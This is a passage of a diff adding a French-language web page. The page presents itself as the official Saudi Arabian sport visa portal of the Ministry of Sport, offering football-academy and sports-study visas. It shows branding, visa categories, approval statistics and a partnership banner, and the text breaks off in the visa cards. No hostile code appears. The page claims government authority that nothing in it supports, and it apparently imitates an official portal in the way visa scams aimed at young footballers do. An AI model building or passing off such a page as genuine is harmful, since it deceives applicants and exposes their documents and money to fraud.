@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KSA Sport Visa — Formation Académique Football</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%23005C2E'/%3E%3Ctext x='50' y='68' font-size='58' text-anchor='middle' fill='white'%3E⚽%3C/text%3E%3C/svg%3E">
+<meta name="description" content="Portail officiel de demande de visa sportif et académique pour les académies de football en Arabie Saoudite. Programmes certifiés FIFA/AFC, formation intégrée.">
+<meta property="og:title" content="KSA Sport Visa — Formation Académique Football">
+<meta property="og:description" content="Accédez aux meilleures académies de football du Royaume. Déposez votre demande en ligne.">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="fr_FR">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700;900&family=DM+Sans:wght@300;400;500;600&family=Noto+Naskh+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --green: #005C2E;
+    --green-mid: #007A3D;
+    --green-light: #00A651;
+    --gold: #C9A84C;
+    --gold-light: #E8C96A;
+    --sand: #F5EDD8;
+    --sand-dark: #EDE0C4;
+    --cream: #FDFAF3;
+    --ink: #0D1E14;
+    --ink-mid: #1A3326;
+    --gray: #6B7A72;
+    --gray-light: #E8EDE9;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: var(--cream);
+    color: var(--ink);
+    overflow-x: hidden;
+  }
+
+  .geo-pattern {
+    background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23005C2E' fill-opacity='0.06'%3E%3Cpath d='M30 0 L60 30 L30 60 L0 30 Z'/%3E%3Cpath d='M30 10 L50 30 L30 50 L10 30 Z' stroke='%23005C2E' stroke-opacity='0.04' stroke-width='1' fill='none'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+  }
+
+  .topbar {
+    background: var(--green);
+    padding: 8px 0;
+    font-size: 11px;
+    color: rgba(255,255,255,0.75);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+  .topbar-inner {
+    max-width: 1200px; margin: 0 auto;
+    padding: 0 40px;
+    display: flex; justify-content: space-between; align-items: center;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+  .topbar-left {
+    display: flex; align-items: center; gap: 16px;
+    flex-wrap: wrap;
+  }
+  .topbar-right { display: flex; gap: 24px; }
+  .topbar-right a { color: rgba(255,255,255,0.6); text-decoration: none; font-size: 10px; letter-spacing: 0.1em; transition: color 0.2s; }
+  .topbar-right a:hover { color: var(--gold-light); }
+
+  header {
+    background: white;
+    border-bottom: 3px solid var(--green);
+    position: sticky; top: 0; z-index: 100;
+    box-shadow: 0 2px 20px rgba(0,92,46,0.08);
+  }
+  .header-inner {
+    max-width: 1200px; margin: 0 auto;
+    padding: 0 40px;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 72px;
+  }
+  .logo-group { display: flex; align-items: center; gap: 16px; }
+  .logo-emblem {
+    width: 48px; height: 48px;
+    background: var(--green);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px;
+    box-shadow: 0 0 0 3px var(--gold);
+  }
+  .logo-text { line-height: 1.2; }
+  .logo-text strong { display: block; font-family: 'Playfair Display', serif; font-size: 15px; color: var(--green); letter-spacing: 0.03em; }
+  .logo-text span { font-size: 10px; color: var(--gray); letter-spacing: 0.12em; text-transform: uppercase; }
+  nav { display: flex; gap: 32px; }
+  nav a { font-size: 12px; font-weight: 500; color: var(--ink-mid); text-decoration: none; letter-spacing: 0.06em; text-transform: uppercase; padding: 4px 0; border-bottom: 2px solid transparent; transition: all 0.2s; }
+  nav a:hover, nav a.active { color: var(--green); border-bottom-color: var(--gold); }
+  .header-cta {
+    background: var(--green); color: white; border: none;
+    padding: 10px 22px; border-radius: 4px; font-size: 12px;
+    font-family: 'DM Sans', sans-serif; font-weight: 600; letter-spacing: 0.08em;
+    text-transform: uppercase; cursor: pointer;
+    transition: background 0.2s, transform 0.1s;
+    box-shadow: 0 3px 10px rgba(0,92,46,0.25);
+  }
+  .header-cta:hover { background: var(--green-light); transform: translateY(-1px); }
+
+  .hero {
+    background: linear-gradient(135deg, var(--ink) 0%, var(--green) 55%, var(--green-mid) 100%);
+    position: relative; overflow: hidden;
+    padding: 80px 0 70px;
+  }
+  .hero::before {
+    content: '';
+    position: absolute; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg width='80' height='80' viewBox='0 0 80 80' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none'%3E%3Cpath d='M40 0 L80 40 L40 80 L0 40 Z' stroke='%23ffffff' stroke-opacity='0.04' stroke-width='1' fill='none'/%3E%3Cpath d='M40 15 L65 40 L40 65 L15 40 Z' stroke='%23ffffff' stroke-opacity='0.03' stroke-width='1' fill='none'/%3E%3C/g%3E%3C/svg%3E");
+  }
+  .hero-arc {
+    position: absolute; bottom: -2px; left: 0; right: 0;
+    height: 60px;
+  }
+  .hero-inner {
+    max-width: 1200px; margin: 0 auto; padding: 0 40px;
+    display: grid; grid-template-columns: 1fr 420px; gap: 60px; align-items: center;
+    position: relative; z-index: 2;
+  }
+  .hero-badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(255,255,255,0.1); border: 1px solid rgba(201,168,76,0.4);
+    border-radius: 100px; padding: 6px 14px;
+    font-size: 10px; color: var(--gold-light); letter-spacing: 0.12em; text-transform: uppercase;
+    margin-bottom: 20px;
+    backdrop-filter: blur(4px);
+  }
+  .hero-badge span { width: 6px; height: 6px; background: var(--gold); border-radius: 50%; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+  .hero h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: 48px; line-height: 1.12; color: white; font-weight: 700;
+    margin-bottom: 12px;
+  }
+  .hero h1 em { color: var(--gold-light); font-style: normal; }
+  .hero-arabic {
+    font-family: 'Noto Naskh Arabic', serif;
+    font-size: 18px; color: rgba(255,255,255,0.5);
+    margin-bottom: 20px; direction: rtl; text-align: left;
+  }
+  .hero-sub { font-size: 15px; color: rgba(255,255,255,0.7); line-height: 1.7; max-width: 480px; margin-bottom: 32px; }
+  .hero-actions { display: flex; gap: 14px; flex-wrap: wrap; }
+  .btn-primary {
+    background: var(--gold); color: var(--ink); border: none;
+    padding: 14px 28px; border-radius: 4px; font-size: 13px;
+    font-family: 'DM Sans', sans-serif; font-weight: 700; letter-spacing: 0.06em;
+    text-transform: uppercase; cursor: pointer;
+    box-shadow: 0 4px 20px rgba(201,168,76,0.45);
+    transition: all 0.2s;
+  }
+  .btn-primary:hover { background: var(--gold-light); transform: translateY(-2px); }
+  .btn-outline {
+    background: transparent; color: white;
+    border: 1.5px solid rgba(255,255,255,0.35);
+    padding: 14px 28px; border-radius: 4px; font-size: 13px;
+    font-family: 'DM Sans', sans-serif; font-weight: 500; letter-spacing: 0.06em;
+    text-transform: uppercase; cursor: pointer;
+    transition: all 0.2s; backdrop-filter: blur(4px);
+  }
+  .btn-outline:hover { border-color: white; background: rgba(255,255,255,0.08); }
+
+  .hero-card {
+    background: rgba(255,255,255,0.96);
+    border-radius: 12px; padding: 30px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    backdrop-filter: blur(10px);
+  }
+  .hero-card h3 {
+    font-size: 13px; font-weight: 700; letter-spacing: 0.1em;
+    text-transform: uppercase; color: var(--green); margin-bottom: 20px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .hero-card h3::after { content: ''; flex: 1; height: 1px; background: var(--gray-light); }
+  .visa-types { display: flex; flex-direction: column; gap: 10px; }
+  .visa-type-item {
+    display: flex; align-items: center; gap: 14px;
+    padding: 14px 16px; border-radius: 8px;
+    border: 1.5px solid var(--gray-light);
+    cursor: pointer; transition: all 0.2s; position: relative;
+  }
+  .visa-type-item:hover { border-color: var(--green); background: rgba(0,92,46,0.03); }
+  .visa-type-item.selected { border-color: var(--green); background: rgba(0,92,46,0.04); }
+  .visa-type-item.selected::before {
+    content: '✓'; position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+    width: 20px; height: 20px; background: var(--green); color: white;
+    border-radius: 50%; font-size: 11px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .visa-icon {
+    width: 38px; height: 38px; border-radius: 8px;
+    display: flex; align-items: center; justify-content: center; font-size: 18px;
+    flex-shrink: 0;
+  }
+  .visa-icon.football { background: #E8F5EE; }
+  .visa-icon.academic { background: #FFF8E6; }
+  .visa-icon.multi { background: #EAF0FF; }
+  .visa-type-text strong { display: block; font-size: 13px; font-weight: 600; color: var(--ink); }
+  .visa-type-text span { font-size: 11px; color: var(--gray); }
+  .hero-card-cta {
+    width: 100%; margin-top: 18px;
+    background: var(--green); color: white; border: none;
+    padding: 14px; border-radius: 8px;
+    font-family: 'DM Sans', sans-serif; font-size: 13px; font-weight: 700;
+    letter-spacing: 0.06em; text-transform: uppercase; cursor: pointer;
+    transition: background 0.2s;
+  }
+  .hero-card-cta:hover { background: var(--green-light); }
+
+  .stats-bar { background: var(--ink); padding: 28px 0; }
+  .stats-inner {
+    max-width: 1200px; margin: 0 auto; padding: 0 40px;
+    display: grid; grid-template-columns: repeat(4, 1fr);
+  }
+  .stat-item {
+    text-align: center; padding: 0 20px;
+    border-right: 1px solid rgba(255,255,255,0.1);
+  }
+  .stat-item:last-child { border-right: none; }
+  .stat-num {
+    font-family: 'Playfair Display', serif; font-size: 34px;
+    color: var(--gold); font-weight: 700;
+  }
+  .stat-label { font-size: 10px; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 0.1em; margin-top: 6px; }
+
+  section { padding: 80px 0; }
+  .section-inner { max-width: 1200px; margin: 0 auto; padding: 0 40px; }
+  .section-header { text-align: center; margin-bottom: 50px; }
+  .section-tag {
+    display: inline-block; font-size: 10px; font-weight: 700;
+    letter-spacing: 0.15em; text-transform: uppercase; color: var(--gold);
+    background: rgba(201,168,76,0.1); border: 1px solid rgba(201,168,76,0.25);
+    padding: 5px 14px; border-radius: 100px; margin-bottom: 14px;
+  }
+  .section-header h2 {
+    font-family: 'Playfair Display', serif; font-size: 36px; color: var(--ink);
+    font-weight: 700; line-height: 1.2; margin-bottom: 14px;
+  }
+  .section-header p { font-size: 15px; color: var(--gray); max-width: 520px; margin: 0 auto; }
+
+  .visa-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }
+  .visa-card {
+    background: white; border-radius: 12px; overflow: hidden;
+    border: 1px solid rgba(0,0,0,0.07);
+    box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    transition: transform 0.25s, box-shadow 0.25s;
+    cursor: pointer;
+  }
+  .visa-card:hover { transform: translateY(-6px); box-shadow: 0 12px 40px rgba(0,92,46,0.12); }
+  .visa-card-header {
+    height: 140px; display: flex; align-items: center; justify-content: center;
+    font-size: 48px; position: relative; overflow: hidden;
+  }
+  .visa-card-header.v1 { background: linear-gradient(135deg, #0A3D1F 0%, #005C2E 100%); }
+  .visa-card-header.v2 { background: linear-gradient(135deg, #1A2B4A 0%, #2E4A8A 100%); }
+  .visa-card-header.v3 { background: linear-gradient(135deg, #4A1A0A 0%, #8A3A1E 100%); }
+  .visa-card-header::before {
+    content: ''; position: absolute; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M30 0 L60 30 L30 60 L0 30 Z' stroke='%23ffffff' stroke-opacity='0.08' stroke-width='1' fill='none'/%3E%3C/svg%3E");
+  }
+  .vc-badge {
+    position: absolute; top: 12px; right: 12px;
+    background: rgba(201,168,76,0.2); border: 1px solid rgba(201,168,76,0.4);
+    color: var(--gold-light); font-size: 9px; font-weight: 700;
+    letter-spacing: 0.1em; text-transform: uppercase;
+    padding: 3px 10px; border-radius: 100px;
+  }
+  .visa-card-body { padding: 24px; }
+  .visa-card-body h3 { font-family: 'Playfair Display', serif; font-size: 20px; color: var(--ink); margin-bottom: 8px; }
+  .visa-card-body p { font-size: 13px; color: var(--gray); line-height: 1.65; margin-bottom: 18px; }
+  .visa-card-meta { display: flex; gap: 16px; margin-bottom: 20px; }
+  .meta-item { display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--gray); }
+  .meta-item strong { color: var(--ink-mid); font-weight: 600; }
+  .visa-card-footer { border-top: 1px solid var(--gray-light); padding-top: 16px; }
+  .tag-list { display: flex; gap: 6px; flex-wrap: wrap; }
+  .tag { font-size: 10px; font-weight: 600; letter-spacing: 0.06em; text-transform: uppercase; background: var(--gray-light); color: var(--gray); padding: 3px 10px; border-radius: 100px; }
+  .tag.green { background: #E8F5EE; color: var(--green); }
+
+  .process-section { background: var(--sand); }
+  .process-steps {
+    display: grid; grid-template-columns: repeat(5, 1fr); position: relative;
+  }
+  .process-steps::before {
+    content: ''; position: absolute; top: 36px; left: 10%; right: 10%;
+    height: 2px; background: linear-gradient(90deg, var(--green), var(--gold));
+    z-index: 0;
+  }
+  .step {
+    display: flex; flex-direction: column; align-items: center; text-align: center;
+    position: relative; z-index: 1; padding: 0 12px;
+  }
+  .step-num {
+    width: 72px; height: 72px; border-radius: 50%;
+    background: white; border: 3px solid var(--green);
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'Playfair Display', serif; font-size: 22px; font-weight: 700;
+    color: var(--green); margin-bottom: 16px;
+    box-shadow: 0 4px 16px rgba(0,92,46,0.15);
+  }
+  .step.highlight .step-num { background: var(--green); color: white; border-color: var(--gold); }
+  .step h4 { font-size: 13px; font-weight: 700; color: var(--ink); margin-bottom: 6px; }
+  .step p { font-size: 11px; color: var(--gray); }
+
+  .docs-section { background: white; }
+  .docs-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 50px; align-items: start; }
+  .docs-list { display: flex; flex-direction: column; gap: 12px; }
+  .doc-item {
+    display: flex; align-items: flex-start; gap: 14px;
+    padding: 16px; border-radius: 8px; border: 1px solid var(--gray-light);
+    transition: border-color 0.2s;
+  }
+  .doc-item:hover { border-color: var(--green); background: rgba(0,92,46,0.02); }
+  .doc-num {
+    width: 28px; height: 28px; border-radius: 50%;
+    background: var(--green); color: white;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; font-weight: 700; flex-shrink: 0;
+  }
+  .doc-text strong { display: block; font-size: 13px; font-weight: 600; color: var(--ink); margin-bottom: 2px; }
+  .doc-text span { font-size: 11px; color: var(--gray); }
+  .doc-required { font-size: 9px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--gold); margin-top: 3px; display: block; }
+  .docs-panel {
+    background: linear-gradient(160deg, var(--green) 0%, var(--ink) 100%);
+    border-radius: 16px; padding: 36px; color: white;
+    position: sticky; top: 90px;
+  }
+  .docs-panel h3 { font-family: 'Playfair Display', serif; font-size: 22px; margin-bottom: 8px; }
+  .docs-panel p { font-size: 13px; color: rgba(255,255,255,0.7); line-height: 1.7; margin-bottom: 24px; }
+  .panel-stat { padding: 14px 0; border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center; }
+  .panel-stat:last-of-type { border-bottom: none; }
+  .panel-stat span { font-size: 12px; color: rgba(255,255,255,0.6); }
+  .panel-stat strong { font-size: 15px; font-weight: 700; color: var(--gold-light); }
+
+  .form-section { background: var(--gray-light); }
+  .form-card {
+    background: white; border-radius: 16px; overflow: hidden;
+    box-shadow: 0 8px 40px rgba(0,0,0,0.08);
+  }
+  .form-body { padding: 36px; }
+  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
+  .form-row.three { grid-template-columns: 1fr 1fr 1fr; }
+  .form-group { display: flex; flex-direction: column; gap: 6px; }
+  .form-group.full { grid-column: 1 / -1; }
+  label { font-size: 11px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--gray); }
+  label span { color: var(--gold); margin-left: 2px; }
+  input[type="text"], input[type="email"], input[type="date"], input[type="number"], select, textarea {
+    border: 1.5px solid var(--gray-light); border-radius: 6px;
+    padding: 11px 14px; font-family: 'DM Sans', sans-serif; font-size: 13px; color: var(--ink);
+    background: white; transition: border-color 0.2s, box-shadow 0.2s;
+    outline: none; appearance: none;
+  }
+  input:focus, select:focus, textarea:focus { border-color: var(--green); box-shadow: 0 0 0 3px rgba(0,92,46,0.08); }
+  select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236B7A72' stroke-width='1.5' fill='none'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 14px center; }
+  .upload-zone {
+    border: 2px dashed var(--gray-light); border-radius: 8px;
+    padding: 24px; text-align: center; cursor: pointer;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .upload-zone:hover { border-color: var(--green); background: rgba(0,92,46,0.02); }
+  .upload-zone p { font-size: 12px; color: var(--gray); margin-top: 8px; }
+  .upload-zone strong { font-size: 13px; color: var(--green); }
+  .file-name { font-size: 12px; color: var(--green); margin-top: 4px; font-weight: 500; display: block; }
+  .form-divider {
+    font-size: 10px; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase;
+    color: var(--gray); margin: 28px 0 20px; display: flex; align-items: center; gap: 12px;
+  }
+  .form-divider::before, .form-divider::after { content: ''; flex: 1; height: 1px; background: var(--gray-light); }
+  .btn-submit {
+    background: var(--green); color: white; border: none;
+    padding: 16px 48px; border-radius: 6px;
+    font-family: 'DM Sans', sans-serif; font-size: 16px; font-weight: 700;
+    letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer;
+    transition: all 0.2s; box-shadow: 0 4px 14px rgba(0,92,46,0.25);
+    display: block; margin: 40px auto 0;
+  }
+  .btn-submit:hover { background: var(--green-light); transform: translateY(-2px); }
+  .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .info-banner {
+    background: var(--green); color: white; padding: 20px 0;
+    display: flex; align-items: center;
+  }
+  .info-banner-inner {
+    max-width: 1200px; margin: 0 auto; padding: 0 40px;
+    display: flex; align-items: center; justify-content: space-between; gap: 20px;
+  }
+  .info-banner p { font-size: 13px; color: rgba(255,255,255,0.85); }
+  .info-banner strong { color: white; }
+  .info-banner a { color: var(--gold-light); font-weight: 600; text-decoration: none; }
+
+  .partners-section { background: white; padding: 50px 0; border-top: 1px solid var(--gray-light); border-bottom: 1px solid var(--gray-light); }
+  .partners-inner { max-width: 1200px; margin: 0 auto; padding: 0 40px; }
+  .partners-label { font-size: 10px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--gray); text-align: center; margin-bottom: 28px; }
+  .partners-row { display: flex; justify-content: center; align-items: center; gap: 48px; flex-wrap: wrap; }
+  .partner-badge {
+    display: flex; flex-direction: column; align-items: center; gap: 4px;
+    opacity: 0.5; filter: grayscale(1); transition: all 0.2s;
+    cursor: pointer;
+  }
+  .partner-badge:hover { opacity: 1; filter: grayscale(0); }
+  .partner-logo-box {
+    width: 64px; height: 64px; background: var(--gray-light);
+    border-radius: 12px; display: flex; align-items: center; justify-content: center;
+    font-size: 24px;
+  }
+  .partner-badge span { font-size: 9px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--gray); }
+
+  footer { background: var(--ink); color: white; padding: 60px 0 0; }
+  .footer-grid { max-width: 1200px; margin: 0 auto; padding: 0 40px 50px; display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 40px; }
+  .footer-brand .logo-group { margin-bottom: 16px; }
+  .footer-brand .logo-text strong { color: white; }
+  .footer-brand .logo-text span { color: rgba(255,255,255,0.4); }
+  .footer-brand p { font-size: 12px; color: rgba(255,255,255,0.5); line-height: 1.8; max-width: 260px; margin-top: 8px; }
+  .footer-col h4 { font-size: 10px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--gold); margin-bottom: 16px; }
+  .footer-col ul { list-style: none; display: flex; flex-direction: column; gap: 10px; }
+  .footer-col ul li a { font-size: 12px; color: rgba(255,255,255,0.5); text-decoration: none; transition: color 0.2s; }
+  .footer-col ul li a:hover { color: white; }
+  .footer-bottom {
+    border-top: 1px solid rgba(255,255,255,0.08); max-width: 1200px;
+    margin: 0 auto; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center;
+  }
+  .footer-bottom p { font-size: 11px; color: rgba(255,255,255,0.3); }
+  .footer-lang { display: flex; gap: 12px; }
+  .footer-lang a {
+    font-size: 10px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase;
+    color: rgba(255,255,255,0.35); text-decoration: none; padding: 4px 10px;
+    border: 1px solid rgba(255,255,255,0.12); border-radius: 4px; transition: all 0.2s;
+  }
+  .footer-lang a:hover, .footer-lang a.active { color: white; border-color: rgba(255,255,255,0.35); }
+
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+  .hero-left > * { animation: fadeUp 0.6s ease both; }
+  .hero-left > *:nth-child(1) { animation-delay: 0.1s; }
+  .hero-left > *:nth-child(2) { animation-delay: 0.2s; }
+  .hero-left > *:nth-child(3) { animation-delay: 0.3s; }
+  .hero-left > *:nth-child(4) { animation-delay: 0.35s; }
+  .hero-left > *:nth-child(5) { animation-delay: 0.4s; }
+  .hero-card { animation: fadeUp 0.6s 0.45s ease both; }
+
+  .menu-toggle { display: none; flex-direction: column; gap: 5px; background: none; border: none; cursor: pointer; padding: 8px; }
+  .menu-toggle span { display: block; width: 24px; height: 2px; background: var(--ink); border-radius: 2px; transition: 0.2s; }
+
+  @media (max-width: 1024px) {
+    .hero-inner { grid-template-columns: 1fr; gap: 40px; }
+    .hero h1 { font-size: 36px; }
+    .visa-grid { grid-template-columns: 1fr 1fr; }
+    .docs-grid { grid-template-columns: 1fr; }
+    .docs-panel { position: static; margin-top: 30px; }
+    .process-steps { grid-template-columns: repeat(5, 1fr); gap: 10px; }
+    .process-steps::before { display: none; }
+    .step-num { width: 50px; height: 50px; font-size: 18px; }
+    .step h4 { font-size: 11px; }
+    .step p { display: none; }
+    .stats-inner { grid-template-columns: repeat(2, 1fr); }
+  }
+  @media (max-width: 768px) {
+    header { position: relative; }
+    .header-inner { flex-wrap: wrap; height: auto; padding: 12px 20px; gap: 10px; }
+    .menu-toggle { display: flex; }
+    nav { display: none; flex-direction: column; gap: 16px; width: 100%; order: 3; background: white; padding: 20px; border-top: 1px solid var(--gray-light); }
+    nav.open { display: flex; }
+    .header-cta { display: none; }
+    .hero { padding: 50px 0; }
+    .hero-inner { padding: 0 20px; }
+    .hero h1 { font-size: 28px; }
+    .hero-actions { flex-direction: column; }
+    .visa-grid { grid-template-columns: 1fr; }
+    .stats-inner { grid-template-columns: 1fr 1fr; }
+    .stat-item { padding: 12px 10px; }
+    .stat-num { font-size: 26px; }
+    .process-steps { grid-template-columns: 1fr; gap: 20px; }
+    .step { flex-direction: row; gap: 14px; text-align: left; }
+    .step-num { margin-bottom: 0; }
+    .form-row, .form-row.three { grid-template-columns: 1fr; }
+    .footer-grid { grid-template-columns: 1fr 1fr; }
+    .info-banner-inner { flex-direction: column; text-align: center; }
+    .partners-row { gap: 24px; }
+  }
+  @media (max-width: 480px) {
+    .topbar-inner { flex-direction: column; gap: 6px; text-align: center; }
+    .topbar-left { justify-content: center; }
+    .stats-inner { grid-template-columns: 1fr; }
+    .footer-grid { grid-template-columns: 1fr; }
+    .hero h1 { font-size: 24px; }
+    .section-header h2 { font-size: 26px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="topbar-left">
+      <span style="font-weight:700; color:white; letter-spacing:0.04em;">🇸🇦 Portail Officiel — Royaume d'Arabie Saoudite</span>
+      <span style="font-weight:700; color:#E8C96A; background:rgba(255,255,255,0.12); padding:3px 12px; border-radius:4px; font-size:11px;">
+        En partenariat avec l’Académie Française de Football — Multi‑Academie à Seine
+      </span>
+    </div>
+    <div class="topbar-right">
+      <a href="#">Français</a>
+      <a href="#">English</a>
+      <a href="#">عربي</a>
+      <a href="#">Aide</a>
+      <a href="#">Contacts</a>
+    </div>
+  </div>
+</div>
+
+<!-- HEADER -->
+<header>
+  <div class="header-inner">
+    <div class="logo-group">
+      <div class="logo-emblem">🏴</div>
+      <div class="logo-text">
+        <strong>KSA Sport Visa Portal</strong>
+        <span>Ministry of Sport · Vision 2030</span>
+      </div>
+    </div>
+    <button class="menu-toggle" aria-label="Menu" onclick="document.querySelector('nav').classList.toggle('open')">
+      <span></span><span></span><span></span>
+    </button>
+    <nav>
+      <a href="#accueil" class="active">Accueil</a>
+      <a href="#visas">Types de Visa</a>
+      <a href="#documents">Documents</a>
+      <a href="#formulaire">Ma Demande</a>
+      <a href="#partenaires">Institutions</a>
+    </nav>
+    <button class="header-cta" onclick="document.getElementById('formulaire').scrollIntoView({behavior:'smooth'})">Commencer la Demande</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero" id="accueil">
+  <div class="hero-inner">
+    <div class="hero-left">
+      <div class="hero-badge"><span></span>Portail Officiel 2026-2027 · Ouvert</div>
+      <h1>Visa de Formation<br><em>Footballistique</em><br>en Arabie Saoudite</h1>
+      <div class="hero-arabic">بوابة التأشيرة الرسمية للتكوين الرياضي</div>
+      <p class="hero-sub">Accédez aux meilleures académies de football du Royaume. Programmes certifiés FIFA/AFC, formation académique intégrée, encadrement professionnel de haut niveau.</p>
+      <div class="hero-actions">
+        <button class="btn-primary" onclick="document.getElementById('formulaire').scrollIntoView({behavior:'smooth'})">Déposer une Demande</button>
+        <button class="btn-outline" onclick="document.getElementById('formulaire').scrollIntoView({behavior:'smooth'})">Vérifier mon Éligibilité</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>Sélectionner un Type de Visa</h3>
+      <div class="visa-types" id="visaTypes">
+        <div class="visa-type-item selected" onclick="selectVisa(this)">
+          <div class="visa-icon football">⚽</div>
+          <div class="visa-type-text"><strong>Académie de Football</strong><span>Formation technique · 3 à 24 mois</span></div>
+        </div>
+        <div class="visa-type-item" onclick="selectVisa(this)">
+          <div class="visa-icon academic">🎓</div>
+          <div class="visa-type-text"><strong>Formation Académique Sport</strong><span>Cursus universitaire · diplômant</span></div>
+        </div>
+        <div class="visa-type-item" onclick="selectVisa(this)">
+          <div class="visa-icon multi">🌐</div>
+          <div class="visa-type-text"><strong>Stage Multi-Sports</strong><span>Immersion sportive · court séjour</span></div>
+        </div>
+      </div>
+      <button class="hero-card-cta" onclick="document.getElementById('formulaire').scrollIntoView({behavior:'smooth'})">Commencer →</button>
+    </div>
+  </div>
+  <svg class="hero-arc" viewBox="0 0 1440 60" preserveAspectRatio="none"><path d="M0,60 C360,0 1080,0 1440,60 L1440,60 L0,60 Z" fill="#FDFAF3"/></svg>
+</section>
+
+<!-- STATS BAR -->
+<div class="stats-bar">
+  <div class="stats-inner">
+    <div class="stat-item"><div class="stat-num">38+</div><div class="stat-label">Académies Partenaires</div></div>
+    <div class="stat-item"><div class="stat-num">5 200</div><div class="stat-label">Visas Accordés / an</div></div>
+    <div class="stat-item"><div class="stat-num">94%</div><div class="stat-label">Taux d'Approbation</div></div>
+    <div class="stat-item"><div class="stat-num">7–12j</div><div class="stat-label">Délai de Traitement</div></div>
+  </div>
+</div>
+
+<!-- VISA CATEGORIES -->
+<section class="geo-pattern" id="visas">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-tag">Catégories de Visa</div>
+      <h2>Choisissez votre Programme de Formation</h2>
+      <p>Trois parcours officiels adaptés aux profils footballistiques, académiques et sportifs polyvalents.</p>
+    </div>
+    <div class="visa-grid">
+      <div class="visa-card">
+        <div class="visa-card-header v1">⚽<div class="vc-badge">Prioritaire</div></div>
+        <div class="visa-card-body">
+          <h3>Visa Football Académique</h3>
+          <p>Destiné aux joueurs souhaitant intégrer une académie labellisée en Arabie Saoudite. Couvre les programmes U13–U23 et formation élite senior.</p>
+          <div class="visa-card-meta"><div class="meta-item">📅 <strong>3–24 mois</strong></div><div class="meta-item">👤 <strong>U10–U23</strong></div></div>
+          <div class="visa-card-footer"><div class="tag-list"><span class="tag green">Résidentiel</span><span class="tag">FIFA Certifié</span><span class="tag">Renouvelable</span></div></div>
+        </div>
+      </div>
+      <div class="visa-card">
+        <div class="visa-card-header v2">🎓</div>
+        <div class="visa-card-body">
+          <h3>Visa Académique Sportif</h3>
+          <p>Pour les étudiants souhaitant suivre un cursus universitaire combinant sport de haut niveau et formation académique diplômante.</p>
+          <div class="visa-card-meta"><div class="meta-item">📅 <strong>1–4 ans</strong></div><div class="meta-item">👤 <strong>+17 ans</strong></div></div>
+          <div class="visa-card-footer"><div class="tag-list"><span class="tag green">Diplômant</span><span class="tag">Bourse possible</span><span class="tag">Universitaire</span></div></div>
+        </div>
+      </div>
+      <div class="visa-card">
+        <div class="visa-card-header v3">🌐</div>
+        <div class="visa-card-body">
+          <h3>Visa Stage Court Séjour</h3>
+          <p>Immersion sportive pour stages, détections, tournois et programmes d'échange entre clubs ou fédérations.</p>
+          <div class="visa-card-meta"><div class="meta-item">📅 <strong>7–90 jours</strong></div><div class="meta-item">👤 <strong>Tout âge</strong></div></div>
